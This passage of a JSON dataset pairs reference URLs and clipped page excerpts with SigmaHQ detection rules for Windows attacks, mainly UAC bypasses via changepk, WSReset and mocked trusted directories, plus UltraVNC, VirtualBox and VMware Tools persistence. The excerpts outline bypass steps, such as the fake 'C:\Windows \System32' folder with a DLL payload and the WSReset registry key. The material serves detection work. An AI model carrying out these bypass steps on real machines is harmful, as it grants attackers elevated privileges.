        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\changepk.exe",
          "ParentImage|endswith": "\\slui.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_changepk_slui.yml"
  },
  "615": {
    "url": "https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e",
    "markdown": "# UAC Bypass by Mocking Trusted Directories Hello Everyone, During research for some new User Account Control (UAC) bypass techniques, I discovered what I believe to be a new bypass method (at the time of this writing). It is worth mentioning that Microsoft doesn’t consider UAC a security boundary, however we still reported the bug to Microsoft and want to share its details here. This method was successfully tested against Windows 10 Build 17134. Before I dive into the details of the bypass, I will first offer a short primer on UAC and its quirks for those unfamiliar with some",
    "sigma_rule": {
      "title": "TrustedPath UAC Bypass Pattern",
      "id": "4ac47ed3-44c2-4b1f-9d51-bf46e8914126",
      "status": "test",
      "description": "Detects indicators of a UAC bypass method by mocking directories",
      "references": [
        "https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e",
        "https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows",
        "https://github.com/netero1010/TrustedPath-UACBypass-BOF"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-08-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|contains": "C:\\Windows \\System32\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_trustedpath.yml"
  },
  "616": {
    "url": "https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows",
    "markdown": "",
    "sigma_rule": {
      "title": "TrustedPath UAC Bypass Pattern",
      "id": "4ac47ed3-44c2-4b1f-9d51-bf46e8914126",
      "status": "test",
      "description": "Detects indicators of a UAC bypass method by mocking directories",
      "references": [
        "https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e",
        "https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows",
        "https://github.com/netero1010/TrustedPath-UACBypass-BOF"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-08-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|contains": "C:\\Windows \\System32\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_trustedpath.yml"
  },
  "617": {
    "url": "https://github.com/netero1010/TrustedPath-UACBypass-BOF",
    "markdown": "# BOF - Trusted Path UAC Bypass Beacon object file implementation for trusted path UAC bypass. The target executable will be called without involving \"cmd.exe\" by using DCOM object. ## Technical details: https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows ## Usage ``` Example: bof-trustedpath-uacbypass ComputerDefaults.exe /root/edputil.dll ``` ## Compile ``` make ``` ## Execution ``` beacon> help bof-trustedpath-uacbypass Version: 1.0 Author: Chris Au Twitter: @netero_1010 Github: @netero1010 ====================Trusted Path UAC Bypass BOF Workflow======================= Step 1: Upload the DLL payload to \"C:\\Windows\\Tasks\" Step 2: Create a new folder called \"C:\\Windows \\System32\" Step 3: Copy desired executable to \"C:\\Windows \\System32\" Step 4: Copy the DLL payload to \"C:\\Windows",
    "sigma_rule": {
      "title": "TrustedPath UAC Bypass Pattern",
      "id": "4ac47ed3-44c2-4b1f-9d51-bf46e8914126",
      "status": "test",
      "description": "Detects indicators of a UAC bypass method by mocking directories",
      "references": [
        "https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e",
        "https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows",
        "https://github.com/netero1010/TrustedPath-UACBypass-BOF"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-08-27",
      "tags": [
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|contains": "C:\\Windows \\System32\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_trustedpath.yml"
  },
  "618": {
    "url": "https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html",
    "markdown": "# Bypass UAC via WSReset.exe Identifies use of WSReset.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes. | Field | Value | |-------------|-------------------------------------| | id | 532b5ed4-7930-11e9-8f5c-d46d6d62a49e| | categories | detect | | confidence | high | | os | windows | | created | 05/17/2019 | | updated | 05/17/2019 | ## MITRE ATT&CK™ Mapping | Field | Value | |-----------|-----------------------------------------------------------------------| | tactics | Privilege Escalation | | techniques| T1088 Bypass User Account Control | ## Query ``` process where subtype.create and parent_process_name == \"wsreset.exe\" and process_name != \"conhost.exe\" ``` ## Detonation Atomic Red",
    "sigma_rule": {
      "title": "Bypass UAC via WSReset.exe",
      "id": "d797268e-28a9-49a7-b9a8-2f5039011c5c",
      "related": [
        {
          "id": "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.",
      "references": [
        "https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://web.archive.org/web/20240417002556/https://www.activecyber.us/activelabs/windows-uac-bypass",
        "https://web.archive.org/web/20200530031302/https://twitter.com/ReaQta/status/1222548288731217921"
      ],
      "author": "E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth",
      "date": "2019-10-24",
      "modified": "2022-05-13",
      "tags": [
        "attack.privilege-escalation",
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wsreset.exe"
        },
        "filter": [
          {
            "Image|endswith": "\\conhost.exe"
          },
          {
            "OriginalFileName": "CONHOST.EXE"
          }
        ],
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown sub processes of Wsreset.exe"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset.yml"
  },
  "619": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
    "markdown": "# /Wsreset.exe Used to reset Windows Store settings according to its manifest file. ### Paths: - `C:\\Windows\\System32\\wsreset.exe` ### Resources: - https://www.activecyber.us/activelabs/windows-uac-bypass - https://twitter.com/ihack4falafel/status/1106644790114947073 - https://github.com/hfiref0x/UACME/blob/master/README.md ### Detections: - Sigma: proc_creation_win_uac_bypass_wsreset_integrity_level.yml - Sigma: proc_creation_win_uac_bypass_wsreset.yml - Sigma: registry_event_bypass_via_wsreset.yml - Splunk: wsreset_uac_bypass.yml - IOC: `wsreset.exe` launching child process other than `mmc.exe` - IOC: Creation or modification of the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` - IOC: Microsoft Defender Antivirus as `Behavior:Win32/UACBypassExp.T!gen` ## UAC bypass During startup, `wsreset.exe` checks the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` for the command to run. The binary will be executed as a high-integrity process without a UAC prompt being displayed to the user. ```",
    "sigma_rule": {
      "title": "Bypass UAC via WSReset.exe",
      "id": "d797268e-28a9-49a7-b9a8-2f5039011c5c",
      "related": [
        {
          "id": "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.",
      "references": [
        "https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://web.archive.org/web/20240417002556/https://www.activecyber.us/activelabs/windows-uac-bypass",
        "https://web.archive.org/web/20200530031302/https://twitter.com/ReaQta/status/1222548288731217921"
      ],
      "author": "E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth",
      "date": "2019-10-24",
      "modified": "2022-05-13",
      "tags": [
        "attack.privilege-escalation",
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wsreset.exe"
        },
        "filter": [
          {
            "Image|endswith": "\\conhost.exe"
          },
          {
            "OriginalFileName": "CONHOST.EXE"
          }
        ],
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown sub processes of Wsreset.exe"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset.yml"
  },
  "620": {
    "url": "https://web.archive.org/web/20240417002556/https://www.activecyber.us/activelabs/windows-uac-bypass",
    "markdown": "# Fileless UAC Bypass in Windows Store Binary **Date:** 3/14/2019 --- ### **Update** - 9/13/2019 Metasploit has added a module for the UAC Bypass in Windows! Most of Metasploit modules are built by community contributors for free (i.e., modules that are worth the effort to be included to make Metasploit users' life easier). This UAC bypass was chosen due to the fact it a) does not require user interaction and b) it’s file-less (no dropping files on disk is needed). It’s common practice to give credit when it's due when creating modules, hence the reference to ACTIVELabs for the discovery.",
    "sigma_rule": {
      "title": "Bypass UAC via WSReset.exe",
      "id": "d797268e-28a9-49a7-b9a8-2f5039011c5c",
      "related": [
        {
          "id": "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.",
      "references": [
        "https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://web.archive.org/web/20240417002556/https://www.activecyber.us/activelabs/windows-uac-bypass",
        "https://web.archive.org/web/20200530031302/https://twitter.com/ReaQta/status/1222548288731217921"
      ],
      "author": "E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth",
      "date": "2019-10-24",
      "modified": "2022-05-13",
      "tags": [
        "attack.privilege-escalation",
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wsreset.exe"
        },
        "filter": [
          {
            "Image|endswith": "\\conhost.exe"
          },
          {
            "OriginalFileName": "CONHOST.EXE"
          }
        ],
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown sub processes of Wsreset.exe"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset.yml"
  },
  "621": {
    "url": "https://web.archive.org/web/20200530031302/https://twitter.com/ReaQta/status/1222548288731217921",
    "markdown": "# Post Jan 29, 2020 #Trickbot ITW is now using a brand new #UACBypass for Windows 10 machines: wsreset.exe uac bypass. #Emotet More info here: https://lolbas-project.github.io/lolbas/Binaries/Wsreset/ https://www.activecyber.us/activelabs/windows-uac-bypass",
    "sigma_rule": {
      "title": "Bypass UAC via WSReset.exe",
      "id": "d797268e-28a9-49a7-b9a8-2f5039011c5c",
      "related": [
        {
          "id": "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.",
      "references": [
        "https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://web.archive.org/web/20240417002556/https://www.activecyber.us/activelabs/windows-uac-bypass",
        "https://web.archive.org/web/20200530031302/https://twitter.com/ReaQta/status/1222548288731217921"
      ],
      "author": "E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth",
      "date": "2019-10-24",
      "modified": "2022-05-13",
      "tags": [
        "attack.privilege-escalation",
        "attack.defense-evasion",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wsreset.exe"
        },
        "filter": [
          {
            "Image|endswith": "\\conhost.exe"
          },
          {
            "OriginalFileName": "CONHOST.EXE"
          }
        ],
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown sub processes of Wsreset.exe"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset.yml"
  },
  "622": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
    "markdown": "# /Wsreset.exe Used to reset Windows Store settings according to its manifest file. ### Paths: - `C:\\Windows\\System32\\wsreset.exe` ### Resources: - https://www.activecyber.us/activelabs/windows-uac-bypass - https://twitter.com/ihack4falafel/status/1106644790114947073 - https://github.com/hfiref0x/UACME/blob/master/README.md ### Detections: - Sigma: proc_creation_win_uac_bypass_wsreset_integrity_level.yml - Sigma: proc_creation_win_uac_bypass_wsreset.yml - Sigma: registry_event_bypass_via_wsreset.yml - Splunk: wsreset_uac_bypass.yml - IOC: `wsreset.exe` launching child process other than `mmc.exe` - IOC: Creation or modification of the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` - IOC: Microsoft Defender Antivirus as `Behavior:Win32/UACBypassExp.T!gen` ## UAC bypass During startup, `wsreset.exe` checks the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` for the command to run. The binary will be executed as a high-integrity process without a UAC prompt being displayed to the user. ```",
    "sigma_rule": {
      "title": "UAC Bypass WSReset",
      "id": "89a9a0e0-f61a-42e5-8957-b1479565a658",
      "status": "test",
      "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://github.com/hfiref0x/UACME",
        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wsreset.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset_integrity_level.yml"
  },
  "623": {
    "url": "https://github.com/hfiref0x/UACME",
    "markdown": "# UACMe ## Folders and Files - Bin - Source - .gitattributes - LICENSE.md - README.md - appveyor.yml ## README Build status: build passing ## UACMe ### Defeating Windows User Account Control - Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor. ### System Requirements - x86-32/x64 Windows 7/8/8.1/10/11 (client, some methods however works on server version too). - Admin account with UAC set on default settings required. ### Usage Run executable from command line: `akagi32 [Key] [Param]` or `akagi64 [Key] [Param]`. See \"Run examples\" below for more info. First parameter is number of method to use, second",
    "sigma_rule": {
      "title": "UAC Bypass WSReset",
      "id": "89a9a0e0-f61a-42e5-8957-b1479565a658",
      "status": "test",
      "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://github.com/hfiref0x/UACME",
        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wsreset.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset_integrity_level.yml"
  },
  "624": {
    "url": "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf",
    "markdown": "# FalconFriday — Detecting UAC Bypasses — 0xFF16 *Aug 20, 2021* --- *Attackers often require full administrative privileges on a machine to be able to use their full attack capabilities. Many attacks originate from a regular user account running with low or medium integrity. Therefore one of the first things an attacker needs to do is bypass User Account Control (UAC) to get access to a process running with high integrity. If the targeted user has administrative privileges this can be achieved by using social engineering techniques to have them approve a UAC prompt or by using a UAC bypass",
    "sigma_rule": {
      "title": "UAC Bypass WSReset",
      "id": "89a9a0e0-f61a-42e5-8957-b1479565a658",
      "status": "test",
      "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config",
      "references": [
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
        "https://github.com/hfiref0x/UACME",
        "https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf"
      ],
      "author": "Christian Burkard (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wsreset.exe",
          "IntegrityLevel": [
            "High",
            "System",
            "S-1-16-16384",
            "S-1-16-12288"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_uac_bypass_wsreset_integrity_level.yml"
  },
  "625": {
    "url": "https://web.archive.org/web/20220224045756/https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious UltraVNC Execution",
      "id": "871b9555-69ca-4993-99d3-35a59f9f3599",
      "status": "test",
      "description": "Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)",
      "references": [
        "https://web.archive.org/web/20220224045756/https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine",
        "https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution",
        "https://uvnc.com/docs/uvnc-viewer/52-ultravnc-viewer-commandline-parameters.html"
      ],
      "author": "Bhabesh Raj",
      "date": "2022-03-04",
      "modified": "2022-03-09",
      "tags": [
        "attack.lateral-movement",
        "attack.g0047",
        "attack.t1021.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "-autoreconnect ",
            "-connect ",
            "-id:"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ultravnc_susp_execution.yml"
  },
  "626": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious UltraVNC Execution",
      "id": "871b9555-69ca-4993-99d3-35a59f9f3599",
      "status": "test",
      "description": "Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)",
      "references": [
        "https://web.archive.org/web/20220224045756/https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine",
        "https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution",
        "https://uvnc.com/docs/uvnc-viewer/52-ultravnc-viewer-commandline-parameters.html"
      ],
      "author": "Bhabesh Raj",
      "date": "2022-03-04",
      "modified": "2022-03-09",
      "tags": [
        "attack.lateral-movement",
        "attack.g0047",
        "attack.t1021.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "-autoreconnect ",
            "-connect ",
            "-id:"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ultravnc_susp_execution.yml"
  },
  "627": {
    "url": "https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious UltraVNC Execution",
      "id": "871b9555-69ca-4993-99d3-35a59f9f3599",
      "status": "test",
      "description": "Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)",
      "references": [
        "https://web.archive.org/web/20220224045756/https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine",
        "https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution",
        "https://uvnc.com/docs/uvnc-viewer/52-ultravnc-viewer-commandline-parameters.html"
      ],
      "author": "Bhabesh Raj",
      "date": "2022-03-04",
      "modified": "2022-03-09",
      "tags": [
        "attack.lateral-movement",
        "attack.g0047",
        "attack.t1021.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "-autoreconnect ",
            "-connect ",
            "-id:"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ultravnc_susp_execution.yml"
  },
  "628": {
    "url": "https://uvnc.com/docs/uvnc-viewer/52-ultravnc-viewer-commandline-parameters.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious UltraVNC Execution",
      "id": "871b9555-69ca-4993-99d3-35a59f9f3599",
      "status": "test",
      "description": "Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)",
      "references": [
        "https://web.archive.org/web/20220224045756/https://www.ria.ee/sites/default/files/content-editors/kuberturve/tale_of_gamaredon_infection.pdf",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine",
        "https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution",
        "https://uvnc.com/docs/uvnc-viewer/52-ultravnc-viewer-commandline-parameters.html"
      ],
      "author": "Bhabesh Raj",
      "date": "2022-03-04",
      "modified": "2022-03-09",
      "tags": [
        "attack.lateral-movement",
        "attack.g0047",
        "attack.t1021.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "-autoreconnect ",
            "-connect ",
            "-id:"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_ultravnc_susp_execution.yml"
  },
  "629": {
    "url": "https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/",
    "markdown": "",
    "sigma_rule": {
      "title": "Detect Virtualbox Driver Installation OR Starting Of VMs",
      "id": "bab049ca-7471-4828-9024-38279a4c04da",
      "status": "test",
      "description": "Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.",
      "references": [
        "https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/",
        "https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/"
      ],
      "author": "Janantha Marasinghe",
      "date": "2020-09-26",
      "modified": "2022-07-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.006",
        "attack.t1564"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains": [
            "VBoxRT.dll,RTR3Init",
            "VBoxC.dll",
            "VBoxDrv.sys"
          ]
        },
        "selection_2": {
          "CommandLine|contains": [
            "startvm",
            "controlvm"
          ]
        },
        "condition": "1 of selection_*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "This may have false positives on hosts where Virtualbox is legitimately being used for operations"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_virtualbox_execution.yml"
  },
  "630": {
    "url": "https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/",
    "markdown": "",
    "sigma_rule": {
      "title": "Detect Virtualbox Driver Installation OR Starting Of VMs",
      "id": "bab049ca-7471-4828-9024-38279a4c04da",
      "status": "test",
      "description": "Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.",
      "references": [
        "https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/",
        "https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/"
      ],
      "author": "Janantha Marasinghe",
      "date": "2020-09-26",
      "modified": "2022-07-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.006",
        "attack.t1564"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains": [
            "VBoxRT.dll,RTR3Init",
            "VBoxC.dll",
            "VBoxDrv.sys"
          ]
        },
        "selection_2": {
          "CommandLine|contains": [
            "startvm",
            "controlvm"
          ]
        },
        "condition": "1 of selection_*"
      },
      "fields": [
        "ComputerName",
        "User",
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "This may have false positives on hosts where Virtualbox is legitimately being used for operations"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_virtualbox_execution.yml"
  },
  "631": {
    "url": "https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Persistence Via VMwareToolBoxCmd.EXE VM State Change Script",
      "id": "7aa4e81a-a65c-4e10-9f81-b200eb229d7d",
      "related": [
        {
          "id": "236d8e89-ed95-4789-a982-36f4643738ba",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script to run for a specific VM state",
      "references": [
        "https://bohops.com/2021/10/08/analyzing-and-detecting-a-vmtools-persistence-technique/",
        "https://www.hexacorn.com/blog/2017/01/14/beyond-good-ol-run-key-part-53/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-14",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\VMwareToolBoxCmd.exe"
          },
          {
            "OriginalFileName": "toolbox-cmd.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " script ",
            " set "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
